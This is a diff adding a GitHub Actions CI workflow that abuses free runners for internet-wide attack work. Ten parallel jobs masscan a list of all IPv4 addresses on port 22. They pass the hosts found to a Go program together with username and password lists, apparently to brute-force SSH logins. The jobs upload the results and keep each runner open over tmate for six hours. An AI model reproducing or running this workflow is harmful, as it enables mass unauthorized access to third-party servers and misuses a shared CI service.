@@ -1,1 +1,201 @@
+name: CI
 
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: sudo apt update && sudo apt install wget tmate -y
+
+      - name: Print job info
+        run: echo "🔹 Running instance ${{ matrix.instance }} of 20"
+
+      - name: Install additional dependencies
+        run: |
+          sudo apt install -y golang masscan libpcap-dev python3-pip
+          pip3 install requests
+
+      - name: Check required files
+        run: |
+          MISSING_FILES=""
+          for file in all_ipv4.txt user.txt pass.txt; do
+            if [ ! -f "$file" ]; then
+              echo "⚠️ Warning: $file not found!"
+              MISSING_FILES="$MISSING_FILES $file"
+            fi
+          done
+
+          if [ ! -f "telee.go" ] && [ ! -f "main.go" ]; then
+            echo "⚠️ Warning: No Go source file found!"
+            MISSING_FILES="$MISSING_FILES go_source"
+          fi
+
+          if [ -n "$MISSING_FILES" ]; then
+            echo "MISSING_FILES=$MISSING_FILES" >> $GITHUB_ENV
+          fi
+
+      - name: Randomly distribute and scan IPs across instances
+        continue-on-error: true
+        run: |
+          MAIN_IP_FILE="all_ipv4.txt"
+          INSTANCE_ID=${{ matrix.instance }}
+          INSTANCE_COUNT=10
+
+          echo "🔍 Instance $INSTANCE_ID of $INSTANCE_COUNT"
+
+          if [ -f "$MAIN_IP_FILE" ] && [ -s "$MAIN_IP_FILE" ]; then
+            # Count total IPs in file
+            TOTAL_IPS=$(wc -l < "$MAIN_IP_FILE")
+            echo "📊 Total IPs in file: $TOTAL_IPS"
+            
+            # Calculate base IPs per instance and remainder
+            IPS_PER_INSTANCE=$((TOTAL_IPS / INSTANCE_COUNT))
+            REMAINDER=$((TOTAL_IPS % INSTANCE_COUNT))
+            
+            # Distribute remainder among first REMAINDER instances
+            if [ $INSTANCE_ID -le $REMAINDER ]; then
+              IPS_FOR_THIS=$((IPS_PER_INSTANCE + 1))
+            else
+              IPS_FOR_THIS=$IPS_PER_INSTANCE
+            fi
+            
+            echo "📊 This instance will scan $IPS_FOR_THIS random IPs"
+            
+            # Get random subset for this instance with unique seed to prevent overlaps
+            INSTANCE_IP_FILE="ipv4_instance_${INSTANCE_ID}.txt"
+            
+            # Use shuf with a unique seed based on instance ID to ensure each instance
+            # gets a different random set without overlaps
+            # This creates a deterministic but unique random selection per instance
+            shuf -n $IPS_FOR_THIS --random-source=<(openssl enc -aes-256-ctr -pass pass:"instance-$INSTANCE_ID-seed-$(date +%Y%m%d)" -nosalt </dev/zero 2>/dev/null) "$MAIN_IP_FILE" > "$INSTANCE_IP_FILE"
+            
+            INSTANCE_IP_COUNT=$(wc -l < "$INSTANCE_IP_FILE")
+            echo "🔍 Instance $INSTANCE_ID will scan $INSTANCE_IP_COUNT random IPs"
+            
+            # Verify we got the expected number
+            if [ "$INSTANCE_IP_COUNT" -ne "$IPS_FOR_THIS" ]; then
+              echo "⚠️ Warning: Expected $IPS_FOR_THIS IPs but got $INSTANCE_IP_COUNT"
+            fi
+            
+            # Run masscan
+            echo "🚀 Starting masscan on $INSTANCE_IP_COUNT IPs..."
+            sudo masscan -iL "$INSTANCE_IP_FILE" -p22 --rate=15000 | \
+              awk '/Discovered/{split($4,p,"/"); print $6 ":" p[1]}' > "open_${INSTANCE_ID}.txt"
+            
+            FOUND_COUNT=$(wc -l < "open_${INSTANCE_ID}.txt")
+            echo "✅ Instance $INSTANCE_ID: Found $FOUND_COUNT open ports from $INSTANCE_IP_COUNT IPs"
+            
+            # Save stats
+            {
+              echo "Instance: $INSTANCE_ID"
+              echo "IPs scanned: $INSTANCE_IP_COUNT"
+              echo "Open ports found: $FOUND_COUNT"
+              echo "---"
+            } >> scan_stats.txt
+          else
+            echo "❌ Main IP file $MAIN_IP_FILE not found or empty!"
+            touch "open_${INSTANCE_ID}.txt"
+          fi
+
+      - name: Run Go program
+        continue-on-error: true
+        run: |
+          echo "🚀 Starting Go program for instance ${{ matrix.instance }}..."
+          
+          # Determine which Go file to run
+          GO_FILE=""
+          if [ -f "telee.go" ]; then
+            GO_FILE="telee.go"
+          elif [ -f "main.go" ]; then
+            GO_FILE="main.go"
+          else
+            echo "❌ No Go source file found!"
+            exit 1
+          fi
+          
+          # Initialize Go module if needed
+          if [ ! -f "go.mod" ]; then
+            go mod init telee.go
+          fi
+          
+          go mod tidy
+          
+          # Check if required files exist
+          if [ ! -f "user.txt" ] || [ ! -f "pass.txt" ]; then
+            echo "⚠️ Warning: user.txt or pass.txt not found!"
+          fi
+          
+          if [ ! -f "open_${{ matrix.instance }}.txt" ]; then
+            echo "⚠️ Warning: open_${{ matrix.instance }}.txt not found, creating empty file"
+            touch "open_${{ matrix.instance }}.txt"
+          fi
+          
+          # Run Go program with instance-specific open file
+          echo "📋 Running: go run $GO_FILE user.txt pass.txt open_${{ matrix.instance }}.txt 20 50 500"
+          go run "$GO_FILE" user.txt pass.txt "open_${{ matrix.instance }}.txt" 20 50 500 &
+          GO_PID=$!
+          
+          echo "Go program started with PID: $GO_PID"
+          
+          # Wait for Go program to finish or timeout
+          wait $GO_PID || echo "⚠️ Go program exited with error"
+          
+          echo "✅ Go program finished for instance ${{ matrix.instance }}"
+
+      - name: Upload scan results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: scan-results-instance-${{ matrix.instance }}
+          path: |
+            open_${{ matrix.instance }}.txt
+            ipv4_instance_${{ matrix.instance }}.txt
+            scan_stats.txt
+          retention-days: 7
+          if-no-files-found: ignore
+
+      - name: Keep alive for 6 hours
+        if: always()
+        continue-on-error: true
+        run: |
+          echo "⏳ Instance ${{ matrix.instance }} finished main tasks, keeping tmate alive for 6 hours..."
+          echo "Connect via tmate if needed:"
+          echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null || echo 'tmate not running')"
+          echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}' 2>/dev/null || echo 'tmate not running')"
+          
+          # Keep the instance alive
+          sleep 21600  # 6 hours
+          
+          echo "✅ Instance ${{ matrix.instance }} completed 6-hour keep-alive"
+
+      - name: Cleanup tmate
+        if: always()
+        continue-on-error: true
+        run: |
+          echo "🧹 Cleaning up tmate session..."
+          # Kill the tmate background loop
+          if [ -n "$TMATE_LOOP_PID" ]; then
+            kill $TMATE_LOOP_PID 2>/dev/null || true
+          fi
+          
+          # Kill tmate session
+          tmate -S /tmp/tmate.sock kill-session 2>/dev/null || true
+          pkill tmate 2>/dev/null || true
+          
+          echo "✅ Cleanup complete for instance ${{ matrix.instance }}"
